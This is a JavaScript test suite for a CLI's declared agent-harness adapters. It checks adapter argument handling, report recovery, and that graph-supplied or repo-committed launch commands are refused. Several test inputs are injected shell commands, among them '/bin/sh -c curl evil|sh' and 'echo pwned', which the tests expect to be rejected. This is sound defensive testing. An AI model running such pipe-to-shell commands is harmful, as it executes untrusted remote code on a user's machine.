"use strict";

// Declarative custom harness adapters (task-spor-dispatch-declarative-custom-
// harness). A profile may name a harness this client has no in-code adapter
// for; what that name EXECUTES is bound machine-locally under
// `dispatch.harness.<id>`. The security line these tests fence is that the
// graph carries only the id — a graph write must never define what a machine
// executes — and the capability line is that a machine which never bound the
// id refuses the dispatch loudly instead of substituting something it does
// have.
//
// Hermetic like the OpenCode/Copilot suite it mirrors: every launch here runs
// a FAKE harness the test itself writes, so there is no real CLI to install
// and nothing to skip. Unlike those, that is not a fidelity compromise — a
// declared harness has no upstream contract to drift against; the declaration
// IS the contract, and it is exactly what these tests exercise.
require("./helpers/tmp-cleanup");
const test = require("node:test");
const assert = require("node:assert");
const { spawnSync } = require("node:child_process");
const fs = require("node:fs");
const os = require("node:os");
const path = require("node:path");

const CLI = path.join(__dirname, "..", "bin", "spor.js");
const dispatchHarnesses = require("../lib/shell/dispatch-harnesses.js");
const sat = require("../lib/kernel/satisfiability.js");
const { normalizeHarnessDeclaration, declaredAdapter, resolveHarness, harnesses } = dispatchHarnesses;
const { writeSpawnableNodeStub, pathWithOnlyGitAndNode } = require("./helpers/portable.js");

const HARNESS = "oxalpha";

function cleanEnv(extra = {}) {
  const env = {};
  for (const [key, value] of Object.entries(process.env)) {
    if (key.startsWith("SPOR_") || key.startsWith("SUBSTRATE_") || key === "XDG_CONFIG_HOME") continue;
    env[key] = value;
  }
  return { ...env, SPOR_FAKE_AGENTS_JSON: "[]", ...extra };
}

function run(args, env, cwd) {
  return spawnSync(process.execPath, [CLI, ...args], { cwd, env: cleanEnv(env), encoding: "utf8" });
}

// A fake config object with just the one method the resolvers call, so the
// unit tests below need no cascade on disk.
function fakeCfg(values) {
  return {
    get(dotted) {
      let cur = values;
      for (const seg of dotted.split(".")) {
        if (cur == null || typeof cur !== "object") return undefined;
        cur = cur[seg];
      }
      return cur;
    },
  };
}

// A scratch graph home + target checkout carrying a task and a profile that
// selects the declared harness. `declaration` goes into the machine-local user
// config exactly where an operator would write it; omitting it produces the
// UNBOUND machine (the refusal case).
function fixture({ declaration, profileExtra = "" } = {}) {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-home-"));
  const nodes = path.join(home, "nodes");
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-target-"));
  fs.mkdirSync(nodes, { recursive: true });
  fs.writeFileSync(path.join(nodes, "task-declared.md"), `---
id: task-declared
type: task
repo: demo
title: Implement the declared-harness dispatch fixture
summary: Exercise a machine-declared harness in a scratch checkout.
status: open
date: 2026-08-26
---
Exercise the declared harness.
`);
  fs.writeFileSync(path.join(nodes, "profile-declared.md"), `---
id: profile-declared
type: profile
title: Declared harness test profile
summary: A profile selecting a harness with no in-code adapter.
harness: ${HARNESS}
model: profile-model
${profileExtra}date: 2026-08-26
---
Declared harness test profile.
`);
  const cfg = {};
  if (declaration) cfg.dispatch = { harness: { [HARNESS]: declaration } };
  fs.writeFileSync(path.join(home, "config.json"), JSON.stringify(cfg, null, 2) + "\n");
  return { home, nodes, repo };
}

// A fake harness speaking an event shape no in-code adapter knows: the whole
// point is that the DECLARATION teaches the supervisor where the session id
// and the final message live.
// `holdFile` keeps the stub ALIVE until that file exists (a test creates it
// when it is ready for the run to end), with a 30s backstop so a failed test
// never leaks a process. It is how a test asserts ORDERING — dispatch returned
// while the run was still going — without a wall-clock bound.
function harnessStub(home, { writesReport = false, exitCode = 0, delayMs = 0, holdFile = null } = {}) {
  return writeSpawnableNodeStub(home, "ox-stub", `
const fs = require("node:fs");
let prompt = "";
process.stdin.setEncoding("utf8");
process.stdin.on("data", (chunk) => { prompt += chunk; });
process.stdin.on("end", () => {
  fs.writeFileSync(process.env.OUTFILE, JSON.stringify({
    args: process.argv.slice(2),
    cwd: process.cwd(),
    prompt,
    sporToken: process.env.SPOR_TOKEN || null,
  }, null, 2));
  process.stdout.write(JSON.stringify({ kind: "start", session: { id: "ox-session-1" } }) + "\\n");
  process.stdout.write(JSON.stringify({ kind: "message", message: { text: "not the final word" } }) + "\\n");
  process.stdout.write(JSON.stringify({ kind: "message", message: { text: "ox final report" } }) + "\\n");
  if (${writesReport}) {
    const flag = process.argv.slice(2).find((a) => a.startsWith("--out="));
    fs.writeFileSync(flag.slice("--out=".length), "written by the harness itself\\n");
  }
  const holdFile = ${JSON.stringify(holdFile)};
  if (holdFile) {
    const deadline = Date.now() + 30000;
    const poll = () => {
      if (fs.existsSync(holdFile) || Date.now() > deadline) process.exit(${exitCode});
      setTimeout(poll, 25);
    };
    poll();
  } else {
    setTimeout(() => process.exit(${exitCode}), ${delayMs});
  }
});
`);
}

function declarationFor(stub, extra = {}) {
  return {
    command: stub,
    args: ["run", "--jsonl", "--dir={cwd}", "--model={model}"],
    label: "Ox Alpha",
    report: { from: "lastText", text: "message.text" },
    session: "session.id",
    ...extra,
  };
}

async function waitFor(read, { timeoutMs = 5000, intervalMs = 25 } = {}) {
  const end = Date.now() + timeoutMs;
  while (Date.now() < end) {
    const value = read();
    if (value) return value;
    await new Promise((resolve) => setTimeout(resolve, intervalMs));
  }
  return null;
}

function awaitJson(file) {
  return waitFor(() => {
    try { return JSON.parse(fs.readFileSync(file, "utf8")); } catch { return null; }
  });
}

function awaitRecord(home, predicate) {
  const runDir = path.join(home, "journal", "dispatch");
  return waitFor(() => {
    if (!fs.existsSync(runDir)) return null;
    const file = fs.readdirSync(runDir).find((name) => name.endsWith(".run.json"));
    if (!file) return null;
    let record;
    try { record = JSON.parse(fs.readFileSync(path.join(runDir, file), "utf8")); } catch { return null; }
    return predicate(record) ? record : null;
  });
}

// ---- the declaration contract ---------------------------------------------

test("a valid declaration synthesizes an adapter fixed to the v1 launch contract", () => {
  const norm = normalizeHarnessDeclaration(HARNESS, declarationFor("/opt/ox/bin/ox"));
  assert.ok(norm.ok, norm.error);
  const adapter = declaredAdapter(norm.declaration);
  assert.strictEqual(adapter.id, HARNESS);
  assert.strictEqual(adapter.label, "Ox Alpha");
  assert.strictEqual(adapter.declared, true);
  // Everything a declaration CANNOT choose (dec-spor-dispatch-harness-adapter-
  // contract's fixed half): the supervised launch mode, the prompt on stdin
  // (no prompt ever enters argv), env-token identity, run-record discovery.
  assert.strictEqual(adapter.launchMode, "supervised-jsonl");
  assert.strictEqual(adapter.identityMode, "env-token");
  assert.strictEqual(adapter.activeDiscovery.kind, "run-records");
  assert.strictEqual(adapter.command({}, null), "/opt/ox/bin/ox");
  const args = adapter.buildArgs({ model: "m", prompt: "secret briefing", reportPath: "/r.md" });
  assert.ok(!args.some((a) => a.includes("secret briefing")), "the prompt never reaches argv");
});

test("argv tokens resolve to the launcher's placeholders, and an unresolved {model} drops its whole entry", () => {
  const { declaration } = normalizeHarnessDeclaration(HARNESS, declarationFor("/opt/ox/bin/ox"));
  const adapter = declaredAdapter(declaration);
  assert.deepStrictEqual(
    adapter.buildArgs({ model: "ox-1" }),
    ["run", "--jsonl", `--dir=${dispatchHarnesses.CWD_PLACEHOLDER}`, "--model=ox-1"]
  );
  assert.deepStrictEqual(
    adapter.buildArgs({}),
    ["run", "--jsonl", `--dir=${dispatchHarnesses.CWD_PLACEHOLDER}`],
    "a model-bearing entry disappears wholesale rather than passing an empty flag"
  );
  const withReport = normalizeHarnessDeclaration(HARNESS, declarationFor("/x", {
    args: ["--out={report}"], report: "file",
  }));
  assert.deepStrictEqual(
    declaredAdapter(withReport.declaration).buildArgs({}),
    [`--out=${dispatchHarnesses.REPORT_PLACEHOLDER}`]
  );
});

test("report and session recovery follow the declared JSON paths", () => {
  const { declaration } = normalizeHarnessDeclaration(HARNESS, declarationFor("/x"));
  const adapter = declaredAdapter(declaration);
  assert.strictEqual(adapter.sessionFromEvent({ session: { id: "s1" } }), "s1");
  assert.strictEqual(adapter.sessionFromEvent({ session: {} }), null);
  assert.strictEqual(adapter.sessionFromEvent(null), null);
  assert.strictEqual(adapter.reportFromEvent({ message: { text: "hi" } }), "hi");
  assert.strictEqual(adapter.reportFromEvent({ message: {} }), null);
  assert.strictEqual(adapter.reportFromEvent(null), null);

  // Several candidate paths, first non-empty string wins — the shape a harness
  // that spells its final message differently per event type needs.
  const multi = normalizeHarnessDeclaration(HARNESS, declarationFor("/x", {
    report: { from: "lastText", text: ["result.text", "message.text"] },
    session: ["thread_id", "session.id"],
  }));
  const m = declaredAdapter(multi.declaration);
  assert.strictEqual(m.reportFromEvent({ message: { text: "second" } }), "second");
  assert.strictEqual(m.reportFromEvent({ result: { text: "first" }, message: { text: "second" } }), "first");
  assert.strictEqual(m.sessionFromEvent({ thread_id: "t1" }), "t1");

  // report: "file" means the harness writes its own report — nothing to parse,
  // so the supervisor's hook is absent and it reads the file back instead.
  const file = normalizeHarnessDeclaration(HARNESS, declarationFor("/x", { args: ["--out={report}"], report: "file" }));
  assert.strictEqual(declaredAdapter(file.declaration).reportFromEvent, undefined);

  // The supervisor rebuilds an adapter from the job file, so a shape the
  // normalizer could never have produced must be REJECTED rather than read as
  // whatever it most resembles — an unrecognized `report.from` silently
  // meaning "file" is a run that ends clean and reports nothing.
  const base = normalizeHarnessDeclaration(HARNESS, declarationFor("/x")).declaration;
  assert.strictEqual(declaredAdapter({ ...base, report: { from: "weird" } }), null);
  assert.strictEqual(declaredAdapter({ ...base, report: [] }), null);
  assert.strictEqual(declaredAdapter({ ...base, report: { from: "lastText" } }), null, "lastText with no paths");
  assert.strictEqual(declaredAdapter({ ...base, session: "session.id" }), null, "session must already be a list");
  assert.strictEqual(declaredAdapter({ ...base, args: undefined }), null);
  assert.strictEqual(declaredAdapter({ ...base, id: "" }), null);
  for (const shape of [null, undefined, {}, [], "x", 7]) {
    assert.strictEqual(declaredAdapter(shape), null, `${JSON.stringify(shape)} is not an adapter`);
  }
});

test("a malformed declaration is refused loudly, naming the key and what is allowed", () => {
  const bad = (raw) => {
    const r = normalizeHarnessDeclaration(HARNESS, raw);
    assert.strictEqual(r.ok, false, `expected a refusal for ${JSON.stringify(raw)}`);
    return r.error;
  };
  assert.match(bad({}), /must be the launcher to run/);
  assert.match(bad({ command: "" }), /must be the launcher to run/);
  assert.match(bad("ox"), /must be an object/);
  assert.match(bad({ command: "/x", args: "run" }), /must be an array of strings/);
  assert.match(bad({ command: "/x", reprot: "lastText" }), /unknown key\(s\) reprot/);
  // The v1 scope constraint: launch mode, prompt transport and identity are
  // NOT the declaration's to choose, so naming them is a typo-grade error.
  assert.match(bad({ command: "/x", launchMode: "native-background" }), /unknown key\(s\) launchMode/);
  assert.match(bad({ command: "/x", report: "stdout" }), /report\.from.*must be "lastText".*or "file"/s);
  assert.match(
    bad({ command: "/x", report: "file" }),
    /must pass the run's report path to the harness with the \{report\} token/,
    "a file-report declaration that never tells the harness where to write is always empty"
  );
  assert.match(bad({ command: "/x", session: 7 }), /must be a JSON path/);
  // The {model} spellings that fail SILENTLY at launch if they are not refused
  // here: a standalone token leaves `--model` to swallow the next argument,
  // and one sharing an entry with {cwd}/{report} takes that path with it when
  // no model resolves.
  // Every VALUE spelling, not just the bare token: each is dropped whole when
  // no model resolves, leaving `--model` to eat the next argument.
  for (const value of ["{model}", " {model}", "anthropic/{model}", "{model}-latest"]) {
    assert.match(
      bad({ command: "/x", args: ["--model", value, "--json"] }),
      /must inline \{model\} into the flag that carries it/,
      `${JSON.stringify(value)} must be refused`
    );
  }
  assert.ok(
    normalizeHarnessDeclaration(HARNESS, { command: "/x", args: ["--model=anthropic/{model}"] }).ok,
    "a flag-shaped entry carrying the token is fine — dropping it removes a complete option"
  );
  assert.match(
    bad({ command: "/x", args: ["--out={report}-{model}"], report: "file" }),
    /mixes \{model\} with \{cwd\}\/\{report\}/
  );
  assert.match(normalizeHarnessDeclaration("Ox Alpha", { command: "/x" }).error, /not a usable harness id/);
});

test("a declaration can never redefine a BUILT-IN harness", () => {
  for (const id of ["claude-code", "codex", "opencode", "copilot"]) {
    const r = normalizeHarnessDeclaration(id, { command: "/opt/impostor" });
    assert.strictEqual(r.ok, false, `${id} must not be redefinable`);
    assert.match(r.error, /is a built-in harness/);
    // …and resolution proves it: the built-in adapter wins outright.
    const resolved = resolveHarness(id, { cfg: fakeCfg({ dispatch: { harness: { [id]: { command: "/opt/impostor" } } } }) });
    assert.strictEqual(resolved.declared, false);
    assert.strictEqual(resolved.adapter.id, id);
    assert.notStrictEqual(resolved.adapter.command({}, null), "/opt/impostor");
  }
});

test("the built-in registry is unchanged by the declared-harness surface", () => {
  assert.deepStrictEqual(
    harnesses().map((a) => a.id),
    ["claude-code", "codex", "opencode", "copilot"],
    "harnesses() with no cascade is exactly the shipped set, in order"
  );
  assert.strictEqual(dispatchHarnesses.getHarness(HARNESS), null, "no cascade, no declared adapter");
  const cfg = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor("/opt/ox/bin/ox") } } });
  assert.deepStrictEqual(
    harnesses({ cfg }).map((a) => a.id),
    ["claude-code", "codex", "opencode", "copilot", HARNESS],
    "a declared harness is appended after the built-ins, never interleaved"
  );
  assert.strictEqual(dispatchHarnesses.getHarness(HARNESS, { cfg }).id, HARNESS);
  assert.deepStrictEqual(dispatchHarnesses.declaredHarnessIds(cfg), [HARNESS]);
  assert.deepStrictEqual(dispatchHarnesses.declaredHarnessIds(fakeCfg({})), []);
});

test("a declared launcher is described and preflighted like any other explicit one", () => {
  const cfg = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor("/opt/ox/bin/ox") } } });
  const adapter = resolveHarness(HARNESS, { cfg }).adapter;
  assert.deepStrictEqual(
    dispatchHarnesses.describeHarnessBin(adapter, { env: {}, cfg }),
    { command: "/opt/ox/bin/ox", source: `dispatch.harness.${HARNESS}.command`, explicit: true, onPath: false }
  );
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-bin-"));
  const real = writeSpawnableNodeStub(dir, "ox", "process.exit(0);");
  const which = () => "/somewhere/on/path/anything";
  assert.strictEqual(
    dispatchHarnesses.harnessAvailable(HARNESS, {
      env: {}, which, cfg: fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor(real) } } }),
    }),
    true
  );
  assert.strictEqual(
    dispatchHarnesses.harnessAvailable(HARNESS, {
      env: {}, which, cfg: fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor(path.join(dir, "absent")) } } }),
    }),
    false,
    "a launcher you NAMED and that is not there is never quietly swapped for something on PATH"
  );
  assert.strictEqual(dispatchHarnesses.harnessAvailable(HARNESS, { env: {}, which, cfg: fakeCfg({}) }), false);
});

test("the machine-capability probe reflects locally declared harness ids", () => {
  const u = require("../scripts/engines/util.js");
  const graphHome = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-probe-"));
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-probe-bin-"));
  const stub = writeSpawnableNodeStub(dir, "ox", "process.exit(0);");
  assert.ok(!u.probeCapabilities(graphHome).harnesses.includes(HARNESS), "undeclared, so unavailable");
  const cfg = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor(stub) } } });
  assert.ok(u.probeCapabilities(graphHome, { cfg }).harnesses.includes(HARNESS));
  const broken = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor(path.join(dir, "absent")) } } });
  assert.ok(
    !u.probeCapabilities(graphHome, { cfg: broken }).harnesses.includes(HARNESS),
    "declaring a harness whose launcher is absent does NOT make the box claim it"
  );
});

// ---- the security line -----------------------------------------------------

test("satisfiability names the machine-local binding as the fix for an unbound harness", () => {
  const { reasons, ok } = sat.satisfies({ harnesses: ["claude-code"] }, { id: "profile-x", harness: HARNESS });
  assert.strictEqual(ok, false);
  assert.match(reasons[0], new RegExp(`harness '${HARNESS}' not available here`));
  assert.match(reasons[0], new RegExp(`dispatch\\.harness\\.${HARNESS}`));
  // A BUILT-IN harness keeps its own (binary-naming) reason, unchanged.
  assert.match(
    sat.satisfies({ harnesses: [] }, { id: "p", harness: "codex" }).reasons[0],
    /harness 'codex' not available here \(codex not on PATH\)/
  );
});

test("a profile carrying launch-defining fields is refused — a graph write never chooses the command", () => {
  assert.deepStrictEqual(sat.graphLaunchFields({ harness: HARNESS, model: "m", mcp: ["spor"] }), []);
  assert.deepStrictEqual(sat.graphLaunchFields({ command: "/bin/sh", args: ["-c", "curl evil|sh"] }), ["command", "args"]);
  for (const field of sat.GRAPH_LAUNCH_FIELDS) {
    assert.deepStrictEqual(sat.graphLaunchFields({ [field]: "x" }), [field]);
  }
});

test("a graph-supplied command is rejected by the real dispatch, before anything is launched", () => {
  const stub = "/does/not/matter";
  for (const profileExtra of ["command: /bin/sh\n", "args: [-c, 'echo pwned']\n", "env: EVIL=1\n"]) {
    const { home, repo } = fixture({ declaration: declarationFor(stub), profileExtra });
    const args = ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"];
    const real = run(args, { SPOR_HOME: home, XDG_CONFIG_HOME: home });
    assert.strictEqual(real.status, 1, real.stdout);
    assert.match(real.stderr, /a graph write must never define what a machine executes/);
    assert.ok(!fs.existsSync(path.join(home, "journal", "dispatch")), "nothing is launched");
    // --print refuses too: a preview that showed a launch the real run rejects
    // would be worse than no preview at all.
    const preview = run([...args, "--print"], { SPOR_HOME: home, XDG_CONFIG_HOME: home });
    assert.strictEqual(preview.status, 1, preview.stdout);
    assert.match(preview.stderr, /a graph write must never define what a machine executes/);
  }
});

test("a machine with no binding for the harness refuses loudly and leaves the assignment intact", () => {
  const { home, repo } = fixture(); // no declaration written
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home }
  );
  assert.strictEqual(result.status, 1, result.stdout);
  assert.match(result.stderr, /can't satisfy profile profile-declared/);
  assert.match(result.stderr, new RegExp(`dispatch\\.harness\\.${HARNESS}`), "the refusal names the binding that is missing");
  assert.match(result.stderr, /the assignment is unchanged/);
  assert.ok(!fs.existsSync(path.join(home, "journal", "dispatch")), "no run record is opened");
  // The node is untouched — still open, still unclaimed.
  const node = fs.readFileSync(path.join(home, "nodes", "task-declared.md"), "utf8");
  assert.match(node, /status: open/);
});

test("a declaration that exists but is unusable is reported as ITS OWN error, not as an unknown harness", () => {
  const { home, repo } = fixture({ declaration: { command: "/opt/ox", reprot: "lastText" } });
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home }
  );
  assert.strictEqual(result.status, 1, result.stdout);
  // It refuses BEFORE the satisfiability verdict (which the broken declaration
  // also fails, since the probe cannot report a harness it cannot parse): an
  // operator who wrote a typo must be told about the typo, not sent off to
  // find another host.
  assert.match(result.stderr, new RegExp(`declaration for harness '${HARNESS}' is unusable`));
  assert.match(result.stderr, /unknown key\(s\) reprot/);
  assert.doesNotMatch(result.stderr, /can't satisfy profile/);
  assert.ok(!fs.existsSync(path.join(home, "journal", "dispatch")), "nothing is launched");
});

// ---- the dispatch path -----------------------------------------------------

test("a declared harness dry-run previews the bound command, argv and session path", () => {
  const { home, repo } = fixture({ declaration: declarationFor("/opt/ox/bin/ox") });
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief", "--print"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home }
  );
  assert.strictEqual(result.status, 0, result.stderr);
  assert.match(result.stdout, new RegExp(`harness: ${HARNESS}`));
  // An EMBEDDED placeholder is rendered and then shell-quoted — the preview
  // line is something people paste, so it must not come back unquoted.
  assert.match(result.stdout, /run:\s+\/opt\/ox\/bin\/ox run --jsonl '--dir=<dir>' '--model=profile-model'/);
  assert.match(result.stdout, /# prompt on stdin/);
  assert.doesNotMatch(result.stdout, /__SPOR_/, "the preview renders placeholders readably");
  assert.match(result.stdout, /session: \(read from the declared session\.id JSON path/);
});

// A declared harness has no read-only posture (v1 scope fixes the declaration
// to five keys), so `--read-only` — the review gate's launch — is REFUSED
// rather than run write-capable behind a warning (review finding 3 on
// task-spor-review-gate-stateful-bounded's first cut).
test("--read-only on a declared harness refuses before launch — no posture means no promise", () => {
  const { home, repo } = fixture({ declaration: declarationFor("/opt/ox/bin/ox") });
  for (const extra of [["--print"], []]) {
    const result = run(
      ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief", "--read-only", ...extra],
      { SPOR_HOME: home, XDG_CONFIG_HOME: home }
    );
    assert.strictEqual(result.status, 1, result.stdout);
    assert.match(result.stderr, /--read-only cannot be enforced on .* — the harness declares no read-only posture/);
    assert.match(result.stderr, /codex \(--sandbox read-only\)/);
    assert.match(result.stderr, /opencode \(--agent plan\)/);
    assert.doesNotMatch(result.stderr, /warning: --read-only/);
    assert.doesNotMatch(result.stdout, /run:/);
  }
});

test("a declared dispatch launches the bound command, binds its session, and recovers the report", async () => {
  const { home, repo } = fixture({ declaration: null });
  // The stub does not exit until the test releases it, so "dispatch returned
  // before the run ended" is an ORDERING fact — the run record cannot be
  // terminal while the child is still held — not a wall-clock bound that a
  // loaded box (five suites running concurrently) turns into a flake
  // (issue-spor-declared-harness-dispatch-timing-flake).
  const release = path.join(home, "release-the-stub");
  const stub = harnessStub(home, { holdFile: release });
  fs.writeFileSync(path.join(home, "config.json"), JSON.stringify({
    dispatch: { harness: { [HARNESS]: declarationFor(stub) } },
  }, null, 2) + "\n");
  const outfile = path.join(home, "invocation.json");
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    // Nothing this harness needs is on PATH — the declaration is the ONLY way
    // it can be found, which is the whole point of the binding.
    { SPOR_HOME: home, XDG_CONFIG_HOME: home, PATH: pathWithOnlyGitAndNode(), OUTFILE: outfile }
  );
  assert.strictEqual(result.status, 0, `${result.stderr}\n${result.stdout}`);
  assert.match(result.stdout, /Ox Alpha supervisor (launching|running)/, "dispatch returns after the launch handshake, not after the run");

  const invocation = await awaitJson(outfile);
  assert.ok(invocation, "the detached stub ran");
  assert.strictEqual(invocation.cwd, repo);
  assert.deepStrictEqual(invocation.args, ["run", "--jsonl", `--dir=${repo}`, "--model=profile-model"]);
  assert.match(invocation.prompt, /task-declared/, "the prompt arrives on stdin");
  assert.ok(!invocation.args.some((a) => a.includes("task-declared")), "and never in argv");

  const live = await awaitRecord(home, () => true);
  assert.ok(live, "the supervisor opened a run record");
  assert.notStrictEqual(live.state, "done", "the run is still going after dispatch has returned — the launcher did not wait for it");

  fs.writeFileSync(release, "");
  const record = await awaitRecord(home, (r) => r.state === "done");
  assert.ok(record, "the supervised run reaches a terminal state");
  assert.strictEqual(record.harness, HARNESS);
  assert.strictEqual(record.launch_mode, "supervised-jsonl");
  assert.strictEqual(record.session_id, "ox-session-1", "the declared session path bound the run");
  assert.strictEqual(
    fs.readFileSync(record.report_path, "utf8").trim(),
    "ox final report",
    "last declared text message wins, matching --output-last-message semantics"
  );
});

test("report: file lets the harness write its own report at the run's report path", async () => {
  const { home, repo } = fixture({ declaration: null });
  const stub = harnessStub(home, { writesReport: true });
  fs.writeFileSync(path.join(home, "config.json"), JSON.stringify({
    dispatch: {
      harness: {
        [HARNESS]: declarationFor(stub, { args: ["run", "--out={report}"], report: "file" }),
      },
    },
  }, null, 2) + "\n");
  const outfile = path.join(home, "invocation.json");
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home, PATH: pathWithOnlyGitAndNode(), OUTFILE: outfile }
  );
  assert.strictEqual(result.status, 0, `${result.stderr}\n${result.stdout}`);
  const record = await awaitRecord(home, (r) => r.state === "done");
  assert.ok(record, "the supervised run reaches a terminal state");
  assert.strictEqual(
    fs.readFileSync(record.report_path, "utf8").trim(),
    "written by the harness itself",
    "the declared file wins — the event stream is not scanned for a report at all"
  );
});

test("spor capabilities reflects a locally declared harness id", () => {
  const { home } = fixture({ declaration: null });
  const stub = harnessStub(home);
  fs.writeFileSync(path.join(home, "config.json"), JSON.stringify({
    dispatch: { harness: { [HARNESS]: declarationFor(stub) } },
  }, null, 2) + "\n");
  const probe = run(["capabilities", "probe"], { SPOR_HOME: home, XDG_CONFIG_HOME: home });
  assert.strictEqual(probe.status, 0, probe.stderr);
  const list = run(["capabilities", "--json"], { SPOR_HOME: home, XDG_CONFIG_HOME: home });
  assert.strictEqual(list.status, 0, list.stderr);
  assert.ok(JSON.parse(list.stdout).harnesses.includes(HARNESS));
});

test("a harness id that names an Object.prototype member is refused, not resolved", () => {
  // Harness ids reach resolution from GRAPH data, so a plain bracket lookup
  // into the adapter registry would answer `Object.prototype`'s own members —
  // a truthy non-adapter that crashes the dispatch on its first method call
  // instead of being refused as the unknown harness it is.
  const cfg = fakeCfg({ dispatch: { harness: { [HARNESS]: declarationFor("/opt/ox/bin/ox") } } });
  for (const id of ["constructor", "toString", "hasOwnProperty", "__proto__"]) {
    assert.strictEqual(dispatchHarnesses.getHarness(id), null, `${id} is not an adapter`);
    assert.strictEqual(resolveHarness(id, { cfg }).adapter, null, `${id} resolves to nothing`);
  }
  const { home, repo } = fixture({ declaration: declarationFor("/opt/ox/bin/ox") });
  fs.writeFileSync(path.join(home, "nodes", "profile-declared.md"), `---
id: profile-declared
type: profile
title: Prototype-member harness
summary: A profile naming an Object.prototype member as its harness.
harness: constructor
date: 2026-08-26
---
Prototype-member harness.
`);
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home }
  );
  assert.strictEqual(result.status, 1, result.stdout);
  assert.doesNotMatch(result.stderr, /is not a function/, "it refuses, it does not crash");
  assert.ok(!fs.existsSync(path.join(home, "journal", "dispatch")), "nothing is launched");
});

test("the declaration, not dispatch.bin, decides what a declared harness launches", () => {
  // Otherwise the probe could report the harness available on the strength of
  // a launcher the dispatch never tries — the box advertises to the fleet a
  // capability every dispatch would then refuse.
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-precedence-"));
  const real = writeSpawnableNodeStub(dir, "ox", "process.exit(0);");
  const cfg = fakeCfg({
    dispatch: { harness: { [HARNESS]: declarationFor(path.join(dir, "absent")) }, bin: { [HARNESS]: real } },
  });
  assert.strictEqual(resolveHarness(HARNESS, { cfg }).adapter.command({}, cfg), path.join(dir, "absent"));
  assert.strictEqual(
    dispatchHarnesses.describeHarnessBin(resolveHarness(HARNESS, { cfg }).adapter, { env: {}, cfg }).command,
    path.join(dir, "absent")
  );
  assert.strictEqual(
    dispatchHarnesses.harnessAvailable(HARNESS, { env: {}, cfg, which: () => real }),
    false,
    "availability answers the command the launch will run, not a dispatch.bin override it ignores"
  );
});

test("a committable repo .spor.json can NEVER bind what this machine executes", () => {
  // The other half of "a graph write must never define what a machine
  // executes": a write anyone can land in a repo must not either. Cloning a
  // repo — or pulling a PR branch into one — would otherwise be enough to
  // choose the command a later dispatch on this box runs, and (with a
  // dispatch.agent set) to get that harness id auto-published to the fleet.
  const { loadConfig } = require("../lib/config.js");
  const repo = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-repolayer-"));
  fs.writeFileSync(path.join(repo, ".spor.json"), JSON.stringify({
    enabled: true,
    dispatch: {
      harness: { evil: { command: "/bin/echo", args: ["run", "--dir={cwd}"] } },
      bin: { codex: "/bin/echo" },
      repos: { demo: repo },
    },
  }, null, 2) + "\n");
  const home = fs.mkdtempSync(path.join(os.tmpdir(), "spor-declared-repolayer-home-"));
  const cfg = loadConfig({ cwd: repo, env: { SPOR_HOME: home, XDG_CONFIG_HOME: home } });
  assert.strictEqual(cfg.get("dispatch.harness"), undefined, "the declaration is dropped");
  assert.strictEqual(cfg.get("dispatch.bin"), undefined, "so is the launcher override");
  assert.deepStrictEqual(cfg.get("dispatch.repos"), { demo: repo }, "the rest of dispatch config is untouched");
  assert.strictEqual(resolveHarness("evil", { cfg }).adapter, null);
  assert.deepStrictEqual(dispatchHarnesses.declaredHarnessIds(cfg), []);
  assert.ok(cfg.warnings.some((w) => /dispatch\.harness/.test(w)), "and it says so rather than dropping it silently");
  assert.ok(cfg.warnings.some((w) => /dispatch\.bin/.test(w)));
});

test("--print surfaces an unusable declaration instead of previewing a launch that cannot happen", () => {
  const { home, repo } = fixture({ declaration: { command: "/opt/ox", reprot: "lastText" } });
  const result = run(
    ["dispatch", "task-declared", "--dir", repo, "--profile", "profile-declared", "--no-brief", "--print"],
    { SPOR_HOME: home, XDG_CONFIG_HOME: home }
  );
  assert.strictEqual(result.status, 0, result.stderr);
  assert.match(result.stdout, new RegExp(`declaration for harness '${HARNESS}' is unusable`));
  assert.match(result.stdout, /unknown key\(s\) reprot/);
  assert.ok(!fs.existsSync(path.join(home, "journal", "dispatch")), "a preview writes nothing");
});
